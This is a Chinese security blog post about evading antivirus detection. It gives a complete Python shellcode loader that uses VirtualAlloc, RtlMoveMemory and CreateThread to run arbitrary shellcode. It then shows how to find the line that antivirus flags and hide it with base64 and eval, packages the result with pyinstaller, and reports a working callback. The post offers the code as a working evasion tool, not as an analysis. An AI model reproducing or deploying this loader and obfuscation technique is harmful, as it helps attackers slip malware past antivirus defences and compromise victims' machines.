# bypass AV 探索一

阅读量 **273313**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-01-20 16:30:42

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t014b51aab59f9c5692.jpg)

## 前言

Bypass
AV一直都是安全安全圈的热门话题，之前多少也有过接触，由于用不到，就没怎么关注。这次刚好趁假期，来研究研究。（由于很多名词网上解释很多，本文只作记录，故不多加解释）

## Base编写

关于Bypass AV常听说几个名词：分离免杀、源码免杀。所谓分离免杀，就是shellcode和加载器分开。源码免杀是从源代码层面免杀。  
分离的话，直接把shellcode当作参数带入即可。我个人更擅长python一些，所以就利用python语言来Bypass。  
从网上找到一个最基础的loader  
loader_3.py

    
    
    # coding: utf-8
    
    import ctypes
    import sys
    
    #（kali生成payload存放位置）
    shellcode = bytearray(bytes.fromhex(sys.argv[1]))
    
    # 设置VirtualAlloc返回类型为ctypes.c_uint64
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    # 申请内存
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
    
    # 放入shellcode
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_uint64(ptr), 
        buf, 
        ctypes.c_int(len(shellcode))
    )
    # 创建一个线程从shellcode防止位置首地址开始执行
    handle = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0), 
        ctypes.c_int(0), 
        ctypes.c_uint64(ptr), 
        ctypes.c_int(0), 
        ctypes.c_int(0), 
        ctypes.pointer(ctypes.c_int(0))
    )
    # 等待上面创建的线程运行完
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
    

对copy的代码稍作更改，改为从参数获取shellcode，经测试功能可行，不过直接被AV拦截。

![](https://p2.ssl.qhimg.com/t01ad7951874504a4cf.png)

## Bypass 探索

基础版本测试可用，下面就针对源码进行免杀探索。  
我这里采用了一种比较笨的办法，一行一行测试，找出特征码：  
只保留第一行，其他行注释掉，然后打包

![](https://p2.ssl.qhimg.com/t01bb99050b41acef2d.png)

`pyinstaller loader_3.py -F`  
打包后扫描，正常

![](https://p0.ssl.qhimg.com/t012dc50b67ec093268.png)

直到测试到第四行，开始报毒

![](https://p3.ssl.qhimg.com/t012a0da3b032ab71e1.png)

注释掉这行，其他全部放开，打包后正常，不再报毒。那么接下来就需要对第四行代码尽心进一步免杀了。  
常用的办法是对这块代码进行base64加密，然后再解密，通过eval函数来执行：

    
    
    string = b"base64密文"
    eval(str(base64.b64decode(string),'utf-8'))
    

最终，第四行改为这样

![](https://p4.ssl.qhimg.com/t01b7636f68e729cd80.png)

![](https://p4.ssl.qhimg.com/t01087624510fa404d9.png)

## 上线

![](https://p2.ssl.qhimg.com/t01d225702ce722263f.png)

![](https://p5.ssl.qhimg.com/t01b4dd52eb3945314b.png)

基本够用。

## 参考

<https://cloud.tencent.com/developer/article/1621172>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **langke** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/227691](/post/id/227691)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [恶意软件](/tag/恶意软件)

 **+1** __2赞

 __收藏

![](https://p4.ssl.qhimg.com/t010857340ce46bb672.jpg) langke

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

